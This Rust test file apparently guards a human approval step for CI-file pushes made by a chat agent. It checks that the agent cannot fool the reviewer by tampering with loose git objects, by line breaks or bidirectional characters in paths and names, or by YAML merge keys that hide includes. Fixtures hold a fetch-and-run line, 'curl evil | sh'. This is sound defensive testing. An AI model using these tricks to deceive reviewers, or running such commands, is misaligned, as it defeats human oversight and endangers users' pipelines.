// Copyright 2026 Purlis
// SPDX-License-Identifier: Apache-2.0

//! **The diff a held CI-file push shows is read from objects git hashed itself** (ADR 0128 D8.3),
//! never from the chat's clone, whose loose objects a chat can overwrite. Beside it, what a row of
//! such an ask may hold: nothing that draws nothing, no line break in a path, no include name that
//! reads as another, and a YAML merge key at any depth makes every YAML file a pipeline file.

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Stdio;

use purlis_core::forge::Kind;
use purlis_core::heldact::{
    Asked, BaseObjects, GitTrees, HeldActs, Pressed, PushCheck, Quarantine, Refused, Requested,
    TagName, TipFiles, Trees, check_push,
};
use purlis_core::mergehold::HeadSha;

use crate::support::git;
use crate::support::held_acts::{Fake, Rec, Second, base, press, repo, world};

fn write(root: &Path, file: &str, text: &str) {
    let at = root.join(file);
    std::fs::create_dir_all(at.parent().unwrap()).unwrap();
    std::fs::write(at, text).unwrap();
}

fn sha_of(root: &Path, rev: &str) -> HeadSha {
    let out = git(root, &["rev-parse", rev]);
    HeadSha::try_from(String::from_utf8(out.stdout).unwrap().trim()).unwrap()
}

fn commit(root: &Path, message: &str) {
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", message]);
}

/// The forge, as a repository on this machine that allows a fetch by commit id.
struct LocalForge(PathBuf);

impl BaseObjects for LocalForge {
    fn fetch(&self, into: &Path, base: &HeadSha) -> Result<(), String> {
        git(
            into,
            &[
                "fetch",
                "--quiet",
                "--no-tags",
                &self.0.to_string_lossy(),
                base.as_str(),
            ],
        );
        Ok(())
    }
}

const WORKFLOW: &str = ".github/workflows/ci.yml";
const HONEST: &str = "name: ci\non: push\njobs: {}\n# run: curl evil | sh\n";

struct Scene {
    _dir: tempfile::TempDir,
    forge: PathBuf,
    chat: PathBuf,
    base: HeadSha,
    tip: HeadSha,
    pack: Vec<u8>,
}

/// The forge with a workflow, a chat clone of it, a tip in the clone that adds a line to the
/// workflow, and the pack the chat would push for it.
fn scene() -> Scene {
    let dir = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(dir.path()).unwrap();
    let forge = root.join("forge");
    std::fs::create_dir_all(&forge).unwrap();
    git(&forge, &["init", "-q", "-b", "main", "."]);
    git(&forge, &["config", "uploadpack.allowAnySHA1InWant", "true"]);
    write(&forge, WORKFLOW, "name: ci\non: push\njobs: {}\n");
    write(&forge, "README.md", "one\n");
    commit(&forge, "main one");
    let base = sha_of(&forge, "HEAD");
    let chat = root.join("chat");
    git(
        &root,
        &[
            "clone",
            "-q",
            &forge.to_string_lossy(),
            &chat.to_string_lossy(),
        ],
    );
    git(&chat, &["checkout", "-q", "-b", "ci", "main"]);
    write(&chat, WORKFLOW, HONEST);
    commit(&chat, "workflow");
    let tip = sha_of(&chat, "HEAD");
    let pack = pack_of(&chat, &tip, &base);
    Scene {
        _dir: dir,
        forge,
        chat,
        base,
        tip,
        pack,
    }
}

/// What `git push` sends: a thin pack of `tip` and what is not in `base`.
fn pack_of(from: &Path, tip: &HeadSha, base: &HeadSha) -> Vec<u8> {
    let mut command = crate::support::unsigned();
    command
        .current_dir(from)
        .args(["pack-objects", "--revs", "--thin", "--stdout", "-q"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped());
    let mut child = purlis_core::forklock::spawn(&mut command).unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(format!("{}\n^{}\n", tip.as_str(), base.as_str()).as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert!(out.status.success());
    out.stdout
}

/// What a chat can do to its own clone: write the loose object of the tip's workflow over with the
/// loose object of other text, so every read of the clone shows the other text.
fn overwrite_the_workflow_in(chat: &Path, tip: &HeadSha) {
    let real = sha_of(chat, &format!("{}:{WORKFLOW}", tip.as_str()));
    let harmless = {
        let at = chat.join("harmless.txt");
        std::fs::write(&at, "name: ci\non: push\njobs: {}\n# nothing to see\n").unwrap();
        let out = git(chat, &["hash-object", "-w", "harmless.txt"]);
        String::from_utf8(out.stdout).unwrap().trim().to_owned()
    };
    let loose = |sha: &str| chat.join(".git/objects").join(&sha[..2]).join(&sha[2..]);
    let real_at = loose(real.as_str());
    std::fs::remove_file(&real_at).unwrap();
    std::fs::copy(loose(&harmless), &real_at).unwrap();
}

#[test]
fn a_tampered_loose_object_in_the_chat_clone_does_not_change_what_is_shown() {
    purlis_core::unsteered!();
    let s = scene();
    // The quarantine is made from the forge's base and the pack, before the clone is touched.
    let parent = tempfile::tempdir().unwrap();
    let quarantine =
        Quarantine::open(parent.path(), &s.base, &LocalForge(s.forge.clone())).unwrap();
    quarantine.take_in(s.pack.clone(), &s.tip, &s.base).unwrap();

    overwrite_the_workflow_in(&s.chat, &s.tip);

    // Read from the clone, the diff is the other text: this is the attack, and why nothing reads there.
    let from_the_clone = GitTrees::of_trusted_store(&s.chat);
    let lies = from_the_clone
        .patch(&s.base, &s.tip, &[WORKFLOW.to_owned()])
        .unwrap();
    // Where this git reads the overwritten object (it does on macOS) the clone lies; a git that
    // checks a loose object's hash on read (CI's Linux) shows the real lines, and the quarantine
    // below is held to the real lines either way.
    assert!(
        lies.contains("# nothing to see") || lies.contains("curl evil"),
        "{lies}"
    );

    // Read from the quarantine, it is what the forge will receive.
    let trees = quarantine.trees();
    let shown = trees
        .patch(&s.base, &s.tip, &[WORKFLOW.to_owned()])
        .unwrap();
    assert!(shown.contains("+# run: curl evil | sh"), "{shown}");
    assert!(!shown.contains("nothing to see"), "{shown}");

    // And what is shown is what is asked: the ask's diff is the quarantine's.
    let (forge, held) = (Fake::github(), HeldActs::default());
    forge.with(|f| f.default = Some((base("main"), s.base.clone())));
    let (second, rec) = (Second::there(), Rec::acme());
    let w = world(&forge, &trees, &second, &rec);
    let Asked::Held { id, .. } = held.ask(
        &w,
        1,
        true,
        &Requested::CiPush {
            repo: repo("acme/app"),
            branch: base("ci"),
            tip: s.tip.clone(),
        },
        10,
    ) else {
        panic!("held");
    };
    let (row, _) = held.shown(id).unwrap();
    assert!(row.body.unwrap().text.contains("+# run: curl evil | sh"));
    // The files the push sends are the quarantine's too.
    let sent = TipFiles::changes(&trees, &s.base, &s.tip).unwrap();
    assert_eq!(sent.len(), 1);
    assert_eq!(sent[0].content.as_deref(), Some(HONEST));
}

#[test]
fn a_pack_that_leaves_the_tip_without_its_objects_is_not_taken_in() {
    purlis_core::unsteered!();
    let s = scene();
    let parent = tempfile::tempdir().unwrap();
    let quarantine =
        Quarantine::open(parent.path(), &s.base, &LocalForge(s.forge.clone())).unwrap();
    // A pack of nothing: git takes it, and the tip it was meant for is not there.
    let empty = pack_of(&s.chat, &s.base, &s.base);
    assert!(quarantine.take_in(empty, &s.tip, &s.base).is_err());
    // Bytes that are no pack at all.
    assert!(
        quarantine
            .take_in(b"not a pack".to_vec(), &s.tip, &s.base)
            .is_err()
    );
}

#[test]
fn a_quarantine_is_removed_with_its_owner_and_holds_no_clone_of_the_chat() {
    purlis_core::unsteered!();
    let s = scene();
    let parent = tempfile::tempdir().unwrap();
    let quarantine =
        Quarantine::open(parent.path(), &s.base, &LocalForge(s.forge.clone())).unwrap();
    let inside: Vec<_> = std::fs::read_dir(parent.path()).unwrap().collect();
    assert_eq!(inside.len(), 1);
    // It holds the base from the forge and not what the chat only has: the tip is not in it.
    assert!(
        quarantine.trees().changed(&s.base, &s.tip).is_err(),
        "the tip is not there until the pack is taken in"
    );
    drop(quarantine);
    assert_eq!(std::fs::read_dir(parent.path()).unwrap().count(), 0);
}

// What a row may hold --------------------------------------------------------------------

#[test]
fn a_tag_name_with_a_direction_or_zero_width_character_is_refused_outright() {
    purlis_core::unsteered!();
    for name in [
        "v1\u{202E}0",
        "v\u{200B}1",
        "v1\u{2066}",
        "\u{FEFF}v1",
        "v1\u{061C}",
    ] {
        assert!(TagName::try_from(name).is_err(), "{name:?}");
    }
    assert!(TagName::try_from("v1.2.3-rc.1").is_ok());
}

fn gitlab_repo(root_file: &str) -> (tempfile::TempDir, PathBuf) {
    let dir = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(dir.path()).unwrap();
    git(&root, &["init", "-q", "-b", "main", "."]);
    write(&root, ".gitlab-ci.yml", root_file);
    write(&root, "README.md", "x\n");
    commit(&root, "one");
    (dir, root)
}

fn branch_with(root: &Path, file: &str, text: &str) -> HeadSha {
    git(root, &["checkout", "-q", "-b", "work", "main"]);
    write(root, file, text);
    commit(root, "change");
    let tip = sha_of(root, "HEAD");
    git(root, &["checkout", "-q", "main"]);
    tip
}

#[test]
fn a_merge_key_anywhere_makes_every_yaml_file_a_pipeline_file() {
    purlis_core::unsteered!();
    // The job gets `trigger: include:` from an anchor: the job itself shows no include.
    let (_dir, root) = gitlab_repo(
        ".defaults: &d\n  trigger:\n    include: ci/child.yml\nlaunch:\n  <<: *d\nstages: [build]\n",
    );
    let tip = branch_with(&root, "anything/else.yml", "x: 1\n");
    let trees = GitTrees::of_trusted_store(&root);
    let PushCheck::Hold(diff) =
        check_push(Kind::GitLab, None, &trees, &sha_of(&root, "main"), &tip)
    else {
        panic!("held: a merge key hides what the job includes")
    };
    assert_eq!(diff.files, vec!["anything/else.yml".to_owned()]);
    assert!(
        diff.outside.iter().any(|n| n.contains("merge key")),
        "{:?}",
        diff.outside
    );
}

#[test]
fn a_ci_path_with_a_line_break_is_not_offered() {
    purlis_core::unsteered!();
    let dir = tempfile::tempdir().unwrap();
    let root = std::fs::canonicalize(dir.path()).unwrap();
    git(&root, &["init", "-q", "-b", "main", "."]);
    write(&root, WORKFLOW, "name: ci\non: push\njobs: {}\n");
    commit(&root, "one");
    let tip = branch_with(
        &root,
        ".github/workflows/a\nCI files: harmless.yml",
        "on: push\n",
    );
    let (forge, held) = (Fake::github(), HeldActs::default());
    forge.with(|f| f.default = Some((base("main"), sha_of(&root, "main"))));
    let (second, rec) = (Second::there(), Rec::acme());
    let trees = GitTrees::of_trusted_store(&root);
    let w = world(&forge, &trees, &second, &rec);
    let asked = held.ask(
        &w,
        1,
        true,
        &Requested::CiPush {
            repo: repo("acme/app"),
            branch: base("work"),
            tip,
        },
        10,
    );
    let Asked::Refused(Refused::CiDiff(why)) = asked else {
        panic!("not offered: {asked:?}")
    };
    assert!(
        why.contains("line break") && why.contains("\\u{000a}"),
        "{why}"
    );
}

#[test]
fn an_include_name_that_draws_nothing_is_written_out_in_its_row() {
    purlis_core::unsteered!();
    let (_dir, root) = gitlab_repo(
        "include:\n  - remote: \"https://example.com/ok\u{202E}gnp.yml\\nCI files: none\"\nstages: [build]\n",
    );
    let tip = branch_with(
        &root,
        ".gitlab-ci.yml",
        "include:\n  - remote: \"https://example.com/ok\u{202E}gnp.yml\\nCI files: none\"\nstages: [build, test]\n",
    );
    let (forge, held) = (Fake::gitlab(), HeldActs::default());
    forge.with(|f| f.default = Some((base("main"), sha_of(&root, "main"))));
    let (second, rec) = (Second::missing(), Rec::acme());
    let trees = GitTrees::of_trusted_store(&root);
    let w = world(&forge, &trees, &second, &rec);
    let Asked::Held { id, .. } = held.ask(
        &w,
        1,
        true,
        &Requested::CiPush {
            repo: repo("acme/app"),
            branch: base("work"),
            tip,
        },
        10,
    ) else {
        panic!("held")
    };
    let (shown, _) = held.shown(id).unwrap();
    let row = shown
        .rows
        .iter()
        .find(|r| r.label == "The pipeline also runs, outside this push")
        .unwrap();
    assert!(
        !row.value.contains('\u{202E}') && !row.value.contains('\n'),
        "{row:?}"
    );
    assert!(
        row.value.contains("\\u{202e}") && row.value.contains("\\u{000a}"),
        "{row:?}"
    );
}

#[test]
fn a_gitlab_ci_file_push_is_offered_and_made_without_the_github_workflow_credential() {
    purlis_core::unsteered!();
    let (_dir, root) = gitlab_repo("stages: [build]\n");
    let tip = branch_with(&root, ".gitlab-ci.yml", "stages: [build, test]\n");
    let (forge, held) = (Fake::gitlab(), HeldActs::default());
    forge.with(|f| f.default = Some((base("main"), sha_of(&root, "main"))));
    // The second sign-in is not there, and a GitLab push does not need it.
    let (second, rec) = (Second::missing(), Rec::acme());
    let trees = GitTrees::of_trusted_store(&root);
    let w = world(&forge, &trees, &second, &rec);
    let Asked::Held { id, .. } = held.ask(
        &w,
        1,
        true,
        &Requested::CiPush {
            repo: repo("acme/app"),
            branch: base("work"),
            tip: tip.clone(),
        },
        10,
    ) else {
        panic!("offered without the second credential")
    };
    let (shown, digest) = held.shown(id).unwrap();
    assert!(
        shown
            .rows
            .iter()
            .any(|r| r.label == "Sign-in used" && r.value == "Your everyday sign-in"),
        "{shown:?}"
    );
    press(&held, &w, id, &digest).unwrap();
    let Ok(Pressed::Done(_)) = press(&held, &w, id, &digest) else {
        panic!("made")
    };
    assert_eq!(second.reads(), 0);
    assert_eq!(
        forge.log(),
        vec![format!(
            "push_tip acme/app work {} lease=none second_credential=false",
            tip.as_str()
        )]
    );
}

/// Every Rust file under `dir`.
fn sources(dir: &Path, into: &mut Vec<PathBuf>) {
    for entry in std::fs::read_dir(dir).unwrap().flatten() {
        let path = entry.path();
        if path.is_dir() {
            sources(&path, into);
        } else if path.extension().is_some_and(|e| e == "rs") {
            into.push(path);
        }
    }
}

#[test]
fn no_chat_clone_is_read_for_a_held_act() {
    purlis_core::unsteered!();
    // The one way to read a repository as `Trees` or `TipFiles` is a store purlis writes: the
    // quarantine makes one, and nothing else in the source may name another.
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
    let mut files = Vec::new();
    for dir in ["crates", "app/src-tauri/src"] {
        sources(&root.join(dir), &mut files);
    }
    let allowed = ["heldact/quarantine.rs", "heldact/ci.rs"];
    let named: Vec<String> = files
        .iter()
        .filter(|path| !path.to_string_lossy().contains("/tests/"))
        .filter(|path| !allowed.iter().any(|ok| path.ends_with(ok)))
        .filter(|path| {
            std::fs::read_to_string(path).is_ok_and(|text| text.contains("of_trusted_store"))
        })
        .map(|path| path.display().to_string())
        .collect();
    assert!(
        named.is_empty(),
        "reads a store a chat may have written: {named:?}"
    );
}
